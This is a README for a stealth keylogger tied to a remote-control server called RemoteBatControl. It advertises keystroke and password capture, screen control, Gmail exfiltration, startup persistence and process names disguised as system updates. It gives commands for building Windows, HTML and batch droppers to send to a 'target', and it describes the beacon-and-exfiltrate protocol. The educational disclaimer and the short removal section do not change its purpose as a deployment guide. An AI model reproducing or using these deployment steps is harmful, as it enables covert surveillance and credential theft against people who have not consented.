# Stealth Keylogger for RemoteBatControl

## ⚠️ IMPORTANT DISCLAIMER

This software is provided for **EDUCATIONAL PURPOSES ONLY**. The creators and distributors of this software do not condone or support any illegal or unethical use of this software. Using this software to monitor or collect data from systems or individuals without their explicit consent may violate local, state, and federal laws, including but not limited to computer fraud and abuse acts, privacy laws, and wiretapping laws.

**YOU ARE SOLELY RESPONSIBLE** for how you use this software and for ensuring that your use complies with all applicable laws and regulations.

## Overview

This package contains a stealth keylogger implementation that integrates with the RemoteBatControl system. The keylogger is designed to run silently on a target device, capture keystrokes, detect passwords, and provide remote control capabilities through the RemoteBatControl web interface.

## Features

- **Stealth Operation**: Runs silently in the background with no visible interface
- **Keystroke Logging**: Captures all keystrokes typed on the target device
- **Password Detection**: Automatically identifies potential password fields
- **Remote Screen Control**: Allows viewing and controlling the target device's screen
- **Gmail Exfiltration**: Optional capability to send captured passwords to a Gmail account
- **Persistence**: Automatically installs itself to run on system startup
- **Cross-Platform**: Works on Windows, macOS, and Linux

## Components

1. **stealth_keylogger.py**: The main keylogger implementation
2. **deploy_keylogger.py**: A tool to create deployable packages of the keylogger

## Usage Instructions

### Setting Up the Server

Before deploying the keylogger, ensure your RemoteBatControl server is running:

```bash
python app.py
```

Note the server's IP address and port (default: http://127.0.0.1:5000).

### Creating a Deployable Package

Use the deployment tool to create a package that can be sent to the target device:

```bash
python deploy_keylogger.py --server http://YOUR_SERVER_IP:5000 --type windows --output keylogger
```

Options for the deployment tool:

- `--server` or `-s`: The URL of your RemoteBatControl server
- `--output` or `-o`: Output path for the keylogger
- `--type` or `-t`: Type of package to create (windows, android, macos, linux, python, html, batch)
- `--gmail` or `-g`: Enable Gmail exfiltration
- `--email` or `-e`: Gmail email address for exfiltration
- `--password` or `-p`: Gmail app password for exfiltration

### Deployment Methods

#### Windows Executable

```bash
python deploy_keylogger.py --server http://YOUR_SERVER_IP:5000 --type windows --output WindowsUpdate
```

This creates a Windows executable that can be sent to the target. When run, it will install the keylogger and connect back to your server.

#### HTML Dropper

```bash
python deploy_keylogger.py --server http://YOUR_SERVER_IP:5000 --type html --output update
```

This creates an HTML file that, when opened in a browser, will prompt the user to download and run the keylogger.

#### Batch File

```bash
python deploy_keylogger.py --server http://YOUR_SERVER_IP:5000 --type batch --output update
```

This creates a batch file that will download and run the keylogger when executed.

### Controlling the Keylogger

Once the keylogger is installed on the target device and connected to your server, you can control it through the RemoteBatControl web interface:

1. Go to http://YOUR_SERVER_IP:5000 in your browser
2. Log in with your credentials
3. Navigate to the "Clients" page
4. Select the connected client
5. Use the "Remote Control" tab to control the keylogger and view captured data

## Technical Details

### Keylogger Implementation

The keylogger uses the following techniques:

- **Keystroke Capture**: Uses the `pynput` library to hook keyboard events
- **Window Tracking**: Monitors active windows to provide context for captured keystrokes
- **Password Detection**: Uses heuristics to identify potential password fields
- **Persistence**: Installs itself to run on system startup using platform-specific methods
- **Stealth**: Hides console windows and uses innocent-looking process names

### Communication Protocol

The keylogger communicates with the RemoteBatControl server using HTTP requests:

- **Registration**: Sends system information to register with the server
- **Command Polling**: Periodically checks for commands from the server
- **Data Exfiltration**: Sends captured keystrokes and screenshots to the server

### Security Considerations

- The keylogger uses HTTPS for communication when available
- Authentication is required to access the captured data
- The keylogger can be configured to use Gmail for additional data exfiltration

## Removal Instructions

To remove the keylogger from a target device:

### Windows
1. Open Registry Editor (regedit)
2. Navigate to `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
3. Delete the `WindowsUpdateService` entry
4. Delete the keylogger executable from the system

### macOS
1. Delete the file at `~/Library/LaunchAgents/com.apple.system.updater.plist`
2. Run `launchctl unload ~/Library/LaunchAgents/com.apple.system.updater.plist`
3. Delete the keylogger executable from the system

### Linux
1. Run `systemctl --user disable system-update-service`
2. Delete the file at `~/.config/systemd/user/system-update-service.service`
3. Delete the keylogger executable from the system

## License

This software is provided for educational purposes only. Use at your own risk.